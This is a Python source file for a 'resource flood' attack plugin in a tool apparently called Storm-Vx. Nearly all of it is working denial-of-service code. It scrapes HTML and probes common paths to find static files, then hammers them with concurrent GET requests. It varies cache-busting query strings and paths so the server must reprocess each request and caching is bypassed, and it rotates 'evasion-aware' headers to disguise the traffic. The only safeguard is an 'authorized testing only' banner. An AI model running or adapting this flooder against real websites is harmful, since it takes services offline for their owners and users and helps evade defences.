#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
vf_resource_flood — Resource Flood Attack Plugin (v24 P0)

Sends rapid GET requests to static resource targets (CSS, JS, images).
v24: Enhanced with auto-discovery of resource URLs from HTML,
cache-busting path variations, and diverse Accept headers.

Part of the Storm-Vx plugin architecture.

FOR AUTHORIZED TESTING ONLY!
"""

from __future__ import annotations

import asyncio
import time
import random
import re
from typing import Dict, Any, List, Set


from plugin_system import PluginMeta, AttackContext
from tester.vf_attack_base import AttackPlugin, ResponseClass
from vf_common import C, rand_cache_bust, rand_str
from utils.session_helpers import attack_timeout

from logging_config import get_logger
logger = get_logger(__name__)

import aiohttp


__all__ = ["ResourceFloodPlugin"]


# Regex to extract resource URLs from HTML
_SRC_RE = re.compile(r'src=["\']([^"\']+\.(css|js|png|jpg|jpeg|gif|svg|ico|woff2?|ttf|eot))["\']', re.IGNORECASE)
_LINK_CSS_RE = re.compile(r'href=["\']([^"\']+\.css)["\']', re.IGNORECASE)

# Common static resource paths
COMMON_RESOURCE_PATHS = [
    "/static/css/main.css", "/static/js/main.js", "/static/js/app.js",
    "/assets/css/style.css", "/assets/js/app.js", "/assets/js/main.js",
    "/dist/main.js", "/dist/main.css", "/dist/app.js",
    "/build/main.js", "/build/main.css",
    "/css/style.css", "/css/main.css", "/css/app.css",
    "/js/main.js", "/js/app.js", "/js/vendor.js", "/js/bundle.js",
    "/images/logo.png", "/images/hero.jpg",
    "/favicon.ico", "/robots.txt",
    "/fonts/main.woff2", "/fonts/icons.woff2",
    "/static/favicon.ico", "/assets/favicon.ico",
]


class ResourceFloodPlugin(AttackPlugin):
    """Flood resource endpoints with GET requests (v24: with auto-discovery).

    v24: Discovers resource URLs from HTML, probes common paths,
    and uses cache-busting path variations to force server reprocessing.
    """

    meta = PluginMeta(
        name='resource_flood',
        version='2.0.0',
        plugin_type='attack',
        description='Resource flood — GET requests with resource discovery and cache busting',
        tags=['http', 'resource', 'flood', 'cdn', 'discovery'],
        priority=15,
        compatible_profiles=[],
        requirements=['aiohttp'],
    )

    def __init__(self) -> None:
        super().__init__()
        self._discovered_resources: List[str] = []
        self._probe_done: asyncio.Event = asyncio.Event()
        self._probe_started: bool = False

    async def _discover_resources(self, context: AttackContext) -> List[str]:
        """v24: Discover resource URLs from HTML + probe common paths."""
        _ssl = context.ssl_param

        discovered: Set[str] = set()
        base_resources = context.resource_targets or [f"{context.site_root}/favicon.ico"]
        site_root = context.site_root

        # Phase 1: Extract resource URLs from HTML
        pages = context.page_targets or [context.url]
        for page in pages[:2]:
            try:
                headers = dict(context.headers)
                async with context.session.get(page, headers=headers,
                                               ssl=_ssl, allow_redirects=True,
                                               timeout=attack_timeout(total=5)) as resp:
                    if resp.status == 200:
                        html = (await resp.text(errors='ignore')).replace('\x00', '')
                        # Extract script/src links
                        for match in _SRC_RE.findall(html):
                            url = match[0]
                            if url.startswith('/'):
                                discovered.add(f"{site_root}{url}")
                            elif url.startswith(site_root):
                                discovered.add(url)
                        # Extract CSS links
                        for match in _LINK_CSS_RE.findall(html):
                            if match.startswith('/'):
                                discovered.add(f"{site_root}{match}")
                            elif match.startswith(site_root):
                                discovered.add(match)
            except (aiohttp.ClientError, asyncio.TimeoutError, OSError) as exc:
                logger.debug(f"Resource discovery request failed for {page}: {exc}")

        # Phase 2: Probe common resource paths
        for path in random.sample(COMMON_RESOURCE_PATHS, min(10, len(COMMON_RESOURCE_PATHS))):
            url = f"{site_root}{path}"
            try:
                headers = dict(context.headers)
                async with context.session.head(url, headers=headers,
                                                ssl=_ssl, allow_redirects=False,
                                                timeout=attack_timeout(total=3)) as resp:
                    if resp.status != 404:
                        discovered.add(url)
            except (aiohttp.ClientError, asyncio.TimeoutError, OSError) as exc:
                logger.debug(f"Resource path probe failed for {url}: {exc}")

        # Always include original resources
        for r in base_resources:
            discovered.add(r)

        result = list(discovered)
        if len(result) > len(base_resources):
            print(f"  {C.G}[RES-FLOOD] Discovered {len(result)} resource targets (was {len(base_resources)}){C.RS}")
        return result

    async def _worker_loop(self, context: AttackContext, worker_id: int) -> None:
        """Resource flood worker: GET requests to discovered resources."""
        _ssl = context.ssl_param

        resources = context.resource_targets or [f"{context.site_root}/favicon.ico"]
        cache_bust = context.extra.cache_bust
        delay_ms = context.extra.delay_ms

        # v24: First worker discovers resources (thread-safe with asyncio.Event)
        if worker_id == 0 and not self._probe_started:
            self._probe_started = True
            self._discovered_resources = await self._discover_resources(context)
            self._probe_done.set()
        elif not self._probe_done.is_set():
            # Other workers wait for discovery (with timeout)
            try:
                await asyncio.wait_for(self._probe_done.wait(), timeout=30.0)
            except asyncio.TimeoutError:
                pass  # Proceed with default targets

        targets = self._discovered_resources if self._discovered_resources else resources

        while not self._stop_event.is_set():
            try:
                url = random.choice(targets)
                if cache_bust:
                    # v24: Multiple cache-busting techniques
                    bust_type = random.random()
                    if bust_type < 0.6:
                        # Standard query param bust
                        url += f"{'&' if '?' in url else '?'}{rand_cache_bust()}"
                    elif bust_type < 0.8:
                        # Path-style bust (/path/→/path/.css)
                        suffix = random.choice([".css", ".js", ".png", "/.css", "/.js"])
                        url = url.rstrip('/') + suffix
                    else:
                        # Fragment bust (doesn't affect server but adds URL diversity)
                        url += f"#v={rand_str(6)}"

                # v25 P1: Use evasion-aware fresh headers for EVERY request
                headers = self._get_fresh_headers(context, "resource")
                t = time.monotonic()
                try:
                    async with context.session.get(url, headers=headers,
                                                   ssl=_ssl, allow_redirects=False) as resp:
                        rt = time.monotonic() - t
                        resp_headers = dict(resp.headers)
                        response_class = self._process_response(resp.status, resp_headers, url=url[:60], worker_id=worker_id)
                        ok = response_class in (ResponseClass.OK, ResponseClass.AUTH_REQUIRED, ResponseClass.REDIRECT)
                        self._capture_response_cookies(resp, context)
                        await self._record("RES", ok, resp.status, rt, url=url[:60])
                except asyncio.CancelledError:
                    raise
                except (aiohttp.ClientError, asyncio.TimeoutError, OSError) as exc:
                    rt = time.monotonic() - t
                    self._on_request_result(worker_id, False)
                    await self._record("RES", False, 0, rt,
                                       err=type(exc).__name__, url=url[:60])

                # v25 P1: Adaptive sleep with backoff
                await self._adaptive_sleep(worker_id, delay_ms)

            except asyncio.CancelledError:
                return
            except (aiohttp.ClientError, asyncio.TimeoutError, OSError) as exc:
                self._on_request_result(worker_id, False)
                await self._record("RES", False, 0, 0, err=type(exc).__name__)
                await asyncio.sleep(0.1)


